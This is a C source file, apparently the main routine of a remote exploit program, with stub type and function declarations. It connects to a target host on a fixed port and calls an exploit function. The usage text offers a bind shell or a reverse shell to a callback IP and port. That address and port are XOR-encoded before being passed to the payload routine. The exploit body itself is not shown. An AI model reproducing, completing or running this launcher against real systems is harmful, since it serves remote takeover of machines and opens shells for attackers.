
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct in_addr {int dummy; } ;
struct sockaddr_in {unsigned short sin_port; struct in_addr sin_addr; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {scalar_t__ h_addr; } ;


 int AF_INET ;
 int PORT ;
 int SOCK_STREAM ;
 int atoi (char*) ;
 int connect (int,struct sockaddr*,int) ;
 int exit (int) ;
 int exploit (int,unsigned long,unsigned short,int) ;
 int fprintf (int ,char*,char*,...) ;
 struct hostent* gethostbyname (char*) ;
 unsigned short htons (int) ;
 unsigned long inet_addr (char*) ;
 int printf (char*,...) ;
 int socket (int ,int ,int ) ;
 int stderr ;

int
main ( int argc, char* argv[] )
{
 int s;
 unsigned long cbip;
 unsigned short cbport;
 struct sockaddr_in remote_addr;
 struct hostent* host_addr;

 if ( argc != 2 )
  if ( argc != 4 )
   { fprintf ( stderr, "Usage\n-----\n[bindshell] %s <ip>\n[reverseshell] %s <ip> <cbip> <cbport>\n", argv[0], argv[0] ); exit ( 1 ); }

 if ( ( host_addr = gethostbyname ( argv[1] ) ) == ((void*)0) )
  { fprintf ( stderr, "Cannot resolve hostname: %s\n", argv[1] ); exit ( 1 ); }

 remote_addr.sin_family = AF_INET;
 remote_addr.sin_addr = * ( ( struct in_addr * ) host_addr->h_addr );
 remote_addr.sin_port = htons ( PORT );

 s = socket ( AF_INET, SOCK_STREAM, 0 );
 printf ( "connecting to %s:%u...", argv[1], PORT );
 if ( connect ( s, ( struct sockaddr * ) &remote_addr, sizeof ( struct sockaddr ) ) == -1 )
  { printf ( "failed!\n" ); exit ( 1 ); }
 printf ( "ok!\n" );

 if ( argc == 4 )
 {
  cbip = inet_addr ( argv[2] ) ^ ( unsigned long ) 0x99999999;
  cbport = htons ( atoi ( argv[3] ) ) ^ ( unsigned short ) 0x9999;
  exploit ( s, cbip, cbport, 0 );
 }
 else
  exploit ( s, ( unsigned long ) ((void*)0), ( unsigned short ) ((void*)0), 1 );
}
